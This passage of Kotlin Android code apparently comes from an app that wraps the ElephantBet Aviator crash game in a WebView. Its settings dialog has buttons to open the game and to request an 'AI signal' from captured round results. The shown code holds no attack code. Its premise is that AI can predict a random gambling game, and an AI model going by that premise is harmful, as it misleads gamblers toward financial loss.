            if (alcance.isNotEmpty()) {
                txtAlcance.text = "Alc: $alcance"
                txtAlcance.setTextColor(Color.WHITE)
                txtAlcance.background = pill(if (cor == "#22c55e") "#1a3a1a" else "#1a3a2a")
            }
            dotView.background = circulo(cor)
            barLayout.setBackgroundColor(Color.parseColor(when (cor) {
                "#22c55e" -> "#071a0f"; "#f59e0b" -> "#1a1200"
                "#7c3aed" -> "#1a0a2e"; "#ec4899" -> "#2a0a1a"
                else -> "#0f172a"
            }))
        }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }
        layout.addView(TextView(this).apply {
            text = "CONFIGURACOES  v$VERSAO_ATUAL"; textSize = 15f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(4) }
        })
        layout.addView(TextView(this).apply {
            text = "Velas capturadas: ${historicoVelas.size}  |  Dentro do Aviator: ${if (dentroDoAviator) "Sim" else "Nao"}"
            textSize = 11f; setTextColor(Color.parseColor("#64748b"))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(20) }
        })
        layout.addView(btn("ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("PEDIR SINAL A IA", "#7c3aed") {
            dialog.dismiss()
            analisandoIA = false
            if (historicoVelas.size >= 3) pedirSinalIA()
            else Toast.makeText(this, "Precisa de ${3 - historicoVelas.size} velas mais", Toast.LENGTH_LONG).show()
        })
        layout.addView(btn("VERIFICAR ACTUALIZACAO", "#1d4ed8") {
            dialog.dismiss(); verificarAtualizacao()
        })
        layout.addView(btn("RECARREGAR SITE", "#334155") { dialog.dismiss(); webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login") })
        layout.addView(btn("FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── DRAWABLES ─────────────────────────────────────────────────
    private fun circulo(cor: String) = GradientDrawable().apply { shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor)) }
    private fun pill(cor: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(20).toFloat(); setColor(Color.parseColor(cor)) }
    private fun roundRect(bg: String) = GradientDrawable().apply { shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat(); setColor(Color.parseColor(bg)) }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD
        isAllCaps = false; background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() {
        super.onDestroy(); webView.destroy()
        handler.removeCallbacksAndMessages(null)
    }
}
